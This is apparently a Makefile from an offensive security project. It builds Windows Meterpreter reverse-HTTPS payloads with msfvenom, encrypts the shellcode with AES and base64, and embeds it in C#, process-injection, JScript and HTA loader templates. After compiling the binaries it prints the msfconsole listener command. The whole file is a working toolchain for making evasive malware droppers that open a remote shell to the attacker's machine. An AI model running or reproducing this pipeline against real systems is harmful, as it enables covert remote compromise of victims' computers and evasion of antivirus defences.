PAYLOAD := windows/x64/meterpreter/reverse_https
LHOST := tun0
LPORT := 443
ccyellow= \e[0;33m
ccend= \e[0m
LISTENER_CMD := "\n$(ccyellow)to start the listener run:\nmsfconsole -q -x \"use multi/handler;set payload $(PAYLOAD);set lhost $(LHOST); set lport $(LPORT); exploit\"$(ccend)"

all: classic classic_aes

sources:
	mkdir sources

classic.cs: sources templates/classic.cs
	export PAYLOAD=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f csharp); \
	cat templates/classic.cs | envsubst > sources/classic.cs

classic.exe: classic.cs
	mcs -out:classic.exe sources/classic.cs
	@echo $(LISTENER_CMD)

classic_aes.cs: sources templates/classic_aes.cs
	# hexdump -vn16 -e'4/8 "%08x" 1 "\n"' /dev/urandom ??
	export KEY=$$(uuidgen | tr -d "-"); \
	export IV=$$(uuidgen | tr -d "-"); \
	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
	cat templates/classic_aes.cs | envsubst > sources/classic_aes.cs

classic_aes.exe: classic_aes.cs
	mcs -out:classic_aes.exe sources/classic_aes.cs
	@echo $(LISTENER_CMD)

sources/process_inject.cs: sources templates/process_inject.cs
	# hexdump -vn16 -e'4/8 "%08x" 1 "\n"' /dev/urandom ??
	export KEY=$$(uuidgen | tr -d "-"); \
	export IV=$$(uuidgen | tr -d "-"); \
	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
	cat templates/process_inject.cs | envsubst > sources/process_inject.cs


process_inject.exe: sources/process_inject.cs
	mcs -out:process_inject.exe sources/process_inject.cs
	@echo $(LISTENER_CMD)

loader.js: templates/loader.js
	export KEY=$$(uuidgen | tr -d "-"); \
	export IV=$$(uuidgen | tr -d "-"); \
	export BASE64_SHELLCODE=$$(msfvenom -p $(PAYLOAD) LHOST=$(LHOST) LPORT=$(LPORT) -f raw | openssl enc -aes-128-cbc -K $$KEY -iv $$IV -nosalt | base64 -w0); \
	cat templates/loader.js | envsubst > loader.js
	@echo $(LISTENER_CMD)

loader.hta: loader.js templates/loader.hta
	export JSCRIPT=$$(cat loader.js); \
	cat templates/loader.hta | envsubst > loader.hta

clean:
	rm -rf \
		sources \
		classic.exe \
		classic_aes.exe \
		process_inject.exe \
		loader.js \
		loader.hta
